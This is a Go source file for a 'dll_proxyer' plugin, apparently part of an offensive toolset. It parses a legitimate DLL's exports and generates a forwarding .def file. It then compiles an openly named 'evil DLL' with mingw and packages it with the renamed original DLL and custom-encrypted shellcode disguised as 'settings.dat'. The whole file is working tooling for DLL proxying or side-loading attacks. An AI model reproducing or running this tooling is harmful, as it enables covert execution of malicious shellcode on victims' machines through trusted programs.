package plugins

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"toolset/utils"

	"github.com/fcharlie/buna/debug/pe"
)

type DllProxyer struct {
	BasePlugin
	shellcode  []byte
	dllData    []byte
	dllName    string
	reGenerate bool // 是否强制重新生成proxyer
}

func NewDllProxyer(shellcode []byte, dllData []byte, reGenerate bool, dllName string) *DllProxyer {
	return &DllProxyer{
		BasePlugin: BasePlugin{
			PluginName: "dll_proxyer",
		},
		shellcode:  shellcode,
		dllData:    dllData,
		reGenerate: reGenerate,
		dllName:    dllName,
	}
}

// getExports 获取 dll 的导出表
func (p *DllProxyer) getExports() (exports []pe.ExportedSymbol, x64 bool, err error) {
	r := bytes.NewReader(p.dllData)
	pf, err := pe.NewFile(r)
	if err != nil {
		return
	}
	x64 = pf.FileHeader.SizeOfOptionalHeader == pe.OptionalHeader64Size
	exports, err = pf.LookupExports()
	return
}

// genDefContent 根据原始dll文件名称和导出表生成def文件内容
func (p *DllProxyer) genDefContent(exportList []pe.ExportedSymbol, oriDllName string) string {
	text := fmt.Sprintf("LIBRARY %s.dll\nEXPORTS", oriDllName)
	for _, i := range exportList {
		text = text + fmt.Sprintf("\n    %s = %s.%s @%d", i.Name, oriDllName, i.Name, i.Ordinal)
	}
	return text
}

// getDlltoolPath 获取系统中 dlltool 的路径
func (p *DllProxyer) getDlltoolPath(x64 bool) string {
	name := "i686-w64-mingw32"
	if x64 {
		name = "x86_64-w64-mingw32"
	}
	return fmt.Sprintf("/usr/%s/bin/dlltool", name)
}

// defToExp 将 def 文件转为 exp 文件
func (p *DllProxyer) defToExp(x64 bool, defPath, expPath string) error {
	dlltoolPath := p.getDlltoolPath(x64)
	cmd := exec.Command(dlltoolPath, "--input-def", defPath, "--output-exp", expPath)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Env = os.Environ()
	err := cmd.Run()
	return err
}

func (p *DllProxyer) buildEvilDll(workDir string, x64 bool, expPath string) ([]byte, error) {
	env := os.Environ()
	env = append(env, "GOOS=windows")
	env = append(env, "GO111MODULE=off")
	env = append(env, "CGO_ENABLED=1")
	if x64 {
		env = append(env, "GOARCH=amd64")
		env = append(env, "CC=x86_64-w64-mingw32-gcc")
	} else {
		env = append(env, "GOARCH=386")
		env = append(env, "CC=i686-w64-mingw32-gcc")
	}
	outputDll := filepath.Join(workDir, "output.dll")
	ldflags := fmt.Sprintf(`-ldflags="-extldflags=-Wl,%s"`, expPath)
	cmd := exec.Command("go", "build", "-o", outputDll, "-buildmode=c-shared", ldflags)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Dir = workDir
	cmd.Env = env
	err := cmd.Run()
	if err != nil {
		return nil, err
	}
	return ioutil.ReadFile(outputDll)
}

func (p *DllProxyer) Run() ([]byte, error) {
	exports, x64, err := p.getExports()
	if err != nil {
		return nil, err
	}
	originDllName := "_" + p.dllName
	defContent := p.genDefContent(exports, strings.TrimSuffix(originDllName, ".dll"))
	// 新建一个临时目录作为工作目录，并把所有的所需的基础文件拷贝过去
	tmpDir, err := ioutil.TempDir("", "dll-proxyer-*")
	if err != nil {
		return nil, err
	}
	err = utils.CopyDir(p.GetPluginDataPath(), tmpDir)
	if err != nil {
		return nil, err
	}
	// 新建def文件
	defPath := filepath.Join(tmpDir, "functions.def")
	err = ioutil.WriteFile(defPath, []byte(defContent), 0777)
	if err != nil {
		return nil, err
	}
	// 将def文件转为exp文件
	expPath := filepath.Join(tmpDir, "functions.exp")
	err = p.defToExp(x64, defPath, expPath)
	if err != nil {
		return nil, err
	}
	// 进行转发dll编译
	evilDllData, err := p.buildEvilDll(tmpDir, x64, expPath)
	if err != nil {
		return nil, err
	}
	// 生成加密处理后的 shellcode
	shellcodeData := utils.CustomEncryptData(p.shellcode)
	// 打包zip
	files := []utils.FileData{
		{
			Name: "settings.dat",
			Body: shellcodeData,
		},
		{
			Name: originDllName,
			Body: p.dllData,
		},
		{
			Name: p.dllName,
			Body: evilDllData,
		},
	}
	zipPath, err := utils.ZipData(files)
	if err != nil {
		return nil, err
	}
	defer os.Remove(zipPath)
	return ioutil.ReadFile(zipPath)
}
